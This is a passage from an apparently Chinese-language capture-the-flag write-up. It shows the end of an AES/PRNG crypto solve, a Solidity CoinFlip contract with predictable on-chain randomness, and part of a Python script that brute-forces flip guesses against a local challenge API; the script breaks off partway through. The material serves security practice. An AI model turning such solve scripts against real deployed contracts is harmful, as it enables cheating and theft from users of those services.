+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>16</span><span class=p>),</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>prng</span><span class=o>.</span><span class=n>randbytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())))</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=blockchain>blockchain</h2><p>合约</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Solidity data-lang=Solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>25</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>CoinFlip</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>event</span> <span class=nc>ConsecutiveWins</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>public</span> <span class=n>consecutiveWins</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>private</span> <span class=n>consecutiveWinNumber</span><span class=o>=</span><span class=mi>10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>private</span> <span class=n>winer</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>private</span> <span class=n>lastNance</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>string</span> <span class=k>private</span> <span class=n>key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>private</span> <span class=n>isStart</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_key</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=n>_key</span><span class=p>)</span><span class=o>!=</span><span class=nb>keccak256</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>),</span><span class=s>&#34;please input key&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>key</span><span class=o>=</span><span class=n>_key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>isStart</span><span class=o>=</span><span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=kd>modifier</span> <span class=nf>onlyEOA</span><span class=p>()</span>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=o>==</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>,</span><span class=s>&#34;only EOA&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>verifyConsecutiveWins</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>isStart</span><span class=o>==</span><span class=kc>true</span><span class=p>,</span><span class=s>&#34;Game is not over&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>consecutiveWins</span><span class=o>==</span><span class=n>consecutiveWinNumber</span><span class=o>&amp;&amp;</span><span class=n>winer</span><span class=o>!=</span><span class=kt>address</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span><span class=s>&#34;no winner&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>flip</span><span class=p>(</span><span class=kt>bool</span> <span class=n>_guess</span><span class=p>)</span> <span class=k>public</span> <span class=n>onlyEOA</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>,</span><span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>isStart</span><span class=o>==</span><span class=kc>false</span><span class=p>,</span><span class=s>&#34;Game over!!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>nonce</span><span class=o>=</span><span class=kt>uint256</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encode</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=n>lastNance</span><span class=p>),</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>,</span><span class=nb>blockhash</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>),</span><span class=nb>block</span><span class=p>.</span><span class=nb>difficulty</span><span class=p>,</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span><span class=p>),</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>))));</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lastNance</span> <span class=o>==</span> <span class=n>nonce</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nb>revert</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>lastNance</span> <span class=o>=</span> <span class=n>nonce</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>coinFlip</span> <span class=o>=</span> <span class=kt>uint256</span><span class=p>(</span><span class=kt>uint256</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>%</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>side</span> <span class=o>=</span> <span class=n>coinFlip</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>?</span> <span class=kc>true</span> <span class=o>:</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>side</span> <span class=o>==</span> <span class=n>_guess</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>consecutiveWins</span><span class=o>==</span><span class=n>consecutiveWinNumber</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=n>winer</span><span class=o>=</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>ConsecutiveWins</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span><span class=n>consecutiveWinNumber</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>isStart</span><span class=o>=</span><span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=kc>true</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>(</span><span class=kc>true</span><span class=p>,</span><span class=s>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>(</span><span class=kc>false</span><span class=p>,</span><span class=s>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>verify</span><span class=p>()</span> <span class=n>verifyConsecutiveWins</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span><span class=kt>uint256</span><span class=p>,</span><span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>winer</span><span class=p>,</span><span class=n>consecutiveWinNumber</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以看到下一次正反是由上一次的 nonce 以及 block 自己的属性等生成的，但是只猜 10 次，所以可以大力出奇迹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://127.0.0.1:3000/api/trans/handle&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Origin&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:3000&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-mobile&#34;</span><span class=p>:</span> <span class=s2>&#34;?0&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Site&#34;</span><span class=p>:</span> <span class=s2>&#34;same-origin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-GB,en-US;q=0.9,en;q=0.8&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-platform&#34;</span><span class=p>:</span> <span class=s1>&#39;&#34;Windows&#34;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;*/*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Referer&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:3000/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br, zstd&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Mode&#34;</span><span class=p>:</span> <span class=s2>&#34;cors&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Dest&#34;</span><span class=p>:</span> <span class=s2>&#34;empty&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua&#34;</span><span class=p>:</span> <span class=s1>&#39;&#34;Google Chrome&#34;;v=&#34;141&#34;, &#34;Not?A_Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;141&#34;&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_guess</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;groupId&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=s2>&#34;0x9908bd276177e5b8f87c68e8d0097eab1959023d&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractName&#34;</span><span class=p>:</span> <span class=s2>&#34;CoinFlip&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcName&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcParam&#34;</span><span class=p>:</span> <span class=p>[</span><span class=n>b</span><span class=p>],</span> 
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAbi&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_guess&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;verify&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>                            <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_key&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;constructor&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>},</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;anonymous&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>                           <span class=p>{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;ConsecutiveWins&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;event&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_num</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;groupId&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=s2>&#34;0x9908bd276177e5b8f87c68e8d0097eab1959023d&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractName&#34;</span><span class=p>:</span> <span class=s2>&#34;CoinFlip&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
